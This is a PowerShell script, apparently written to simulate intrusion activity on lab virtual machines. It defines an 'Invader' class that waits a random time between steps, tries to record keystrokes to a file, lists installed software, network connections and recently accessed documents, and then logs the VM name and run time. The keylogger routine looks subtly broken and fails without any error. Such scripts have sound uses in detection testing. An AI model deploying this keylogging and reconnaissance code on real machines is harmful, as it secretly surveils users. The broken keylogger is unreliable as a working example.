class Invader{
    
    [int32]$time

    Invader(){}
    # grab user
    [string] grabUser(){
        $unrefineduser = whoami.exe
        $userArr = $unrefineduser -split "\\"
        return $userArr[1]
    }
    # sleep for this amount of time
    sleep([int]$min, [int]$max){
        $this.time = Get-Random -Minimum $min -Maximum $max
        Start-Sleep -Seconds $this.time
    }

    keylog_input() {
        try {
            $path = "$env:USERPROFILE\Documents\keylog.txt"
            Add-Type -AssemblyName System.Windows.Forms
            $keylog = [System.Windows.Forms.Application]::AddMessageFilter({ $msg, $keylog = $path; Add-Content $keylog $msg.KeyChar; $false })
            Start-Sleep -Seconds 60
            [System.Windows.Forms.Application]::RemoveMessageFilter($keylog)
        }
        catch {
        }
    }

    list_installed_software() {
        try {
            $softwareList = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion
            if ($softwareList) {
                $softwareList | Format-Table -AutoSize
            } else {
                "No software installed."
            }
        }
        catch {
            "Error: Unable to list installed software."
        }
    }

    get_netstat(){
        try{
            netstat -noa
            }
        catch{
            ""
        }
    }

    retrieve_recently_accessed_files() {
    try {
        $recentFiles = Get-ChildItem -Path $env:USERPROFILE\Documents -Recurse -File | Sort-Object -Property LastAccessTime -Descending | Select-Object -First 10
        if ($recentFiles) {
            $recentFiles | Format-Table -Property FullName, LastAccessTime -AutoSize
        } else {
            "No recently accessed files found."
        }
    }
    catch {
        "Error: Unable to retrieve recently accessed files."
    }
}
}
# do stuff
$Invade = New-Object -TypeName Invader
$Invade.sleep(10,20)
$Invade.keylog_input()
$Invade.sleep(10,20)
$Invade.list_installed_software()
$Invade.sleep(10,20)
$Invade.get_netstat()
$Invade.sleep(10,20)
$Invade.retrieve_recently_accessed_files()

# Logging starts here
# Get VM unique identifier, current time, and script name
$vmID = (Get-WmiObject -Class Win32_ComputerSystem).Name
$currentTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
$scriptName = $MyInvocation.MyCommand.Name

# Define the path for the log file
$logPath = "C:\Users\User1\Desktop\logs\logFile.log"

# Format the log entry
$logEntry = "VM ID: $vmID, Time: $currentTime, Script: $scriptName"

# Write log entry to the log file
Add-Content -Path $logPath -Value $logEntry


Write-Host "Log file saved."